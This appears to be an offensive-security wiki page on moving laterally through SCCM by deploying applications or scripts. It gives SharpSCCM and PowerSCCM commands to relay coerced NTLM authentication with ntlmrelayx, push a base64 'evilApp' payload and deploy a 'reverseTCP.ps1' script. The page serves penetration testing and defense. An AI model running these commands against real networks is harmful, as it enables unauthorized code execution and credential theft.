---
authors: BlWasp, ShutdownRepo, felixbillieres
category: ad
---

# Applications and scripts deployment

## Theory

With administrative rights on the primary site server, applications and scripts can be deployed on target devices to move laterally across the network.

> [!TIP]
> For additional attack techniques and defense strategies related to application and script deployment in SCCM, refer to the following techniques from the [Misconfiguration-Manager repository](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques):
> - [EXEC-1: App Deployment](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/EXEC/EXEC-1/exec-1_description.md)
> - [EXEC-2: Script Deployment](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/EXEC/EXEC-2/exec-2_description.md)

## Practice

::: tabs

=== SharpSCCM

References:

* [https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)

**Step 1**: Confirm Access permissions

```powershell
SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
```

---
**Step 2**: Find target device

```powershell
# Search for device of user "Frank.Zapper"
SharpSCCM.exe get primary-users -u Frank.Zapper

# List all active SCCM devices where the SCCM client is installed 
### CAUTION: This could be huge
SharpSCCM.exe get devices -w "Active=1 and Client=1"
```

---
**Step 3**: Deploy Application to target device

In this final step you can choose to either create an actual application to deploy to the target machine or just trigger an install from a remote UNC path in order to capture and relay an incoming NTLM authentication. Note the following:

* Coercing an authentication might be stealthier (and requires less cleanup) than installing an application
* To capture and relay NTLM credentials, the target device must support NTLM (very likely).
* The neat part: The Authentication can be coerced using the primary user account of the device OR the device computer account (you can choose)

```bash
# Prep capturing server
## ntlmrelayx targeting 10.250.2.179
ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179

# Also keep Pcredz running, just in case
Pcredz -i enp0s8 -t
```
```powershell
# Run the attack
SharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET
```

Note that the incoming authentication requsts might take a while (couple minutes) to roll in...

![](<../assets/SCCM_Lateral_Movement_Execution_Step3_Trigger_Deployment.png>)

![](<../assets/SCCM_Lateral_Movement_Execution_Step3_Capture_Authentication.png>)

=== PowerSCCM

With sufficient rights on the central SCCM server (sufficient rights on WMI), it is possible to deploy applications or scripts on the Active Directory machines with [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM) (Powershell).

```powershell
# Create a SCCM Session via WMI with the Site Code
Find-SccmSiteCode -ComputerName SCCMServer
New-SccmSession -ComputerName SCCMServer -SiteCode $SITE_CODE -ConnectionType WMI

# Retrieve the computers linked to the SCCM server
Get-SccmSession | Get-SccmComputer

# Create a computer collection
Get-SccmSession | New-SccmCollection -CollectionName "collection" -CollectionType "Device"

# Add computers to the collection
Get-SccmSession | Add-SccmDeviceToCollection -ComputerNameToAdd "target" -CollectionName "collection"

# Create an application to deploy
Get-SccmSession | New-SccmApplication -ApplicationName "evilApp" -PowerShellB64 $BASE64_PAYLOAD

# Create an application deployment with the application and the collection previously created
Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "evilApp" -AssignmentName "assig" -CollectionName "collection"

# Force the machine in the collection to check the application update (and force the install)
Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "collection"
```

If deploying applications fails, deploying CMScripts is an alternative, which requires a "Configuration Manager" drive on the SCCM server.

This [pull request](https://github.com/PowerShellMafia/PowerSCCM/pull/6) on PowerSCCM can be used to do everything in one command. It uses the script `configurationmanager.psd1` created by Microsoft, usually installed on SCCM servers.

```powershell
# Create a CM drive if it doesn't already exist and deploy a CMScript on a target
New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.domain.local' -TargetDevice 'target' -Path '.\reverseTCP.ps1' -ScriptName 'evilScript'
```

:::

## Resources

[https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)

[https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/EXEC](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/EXEC)

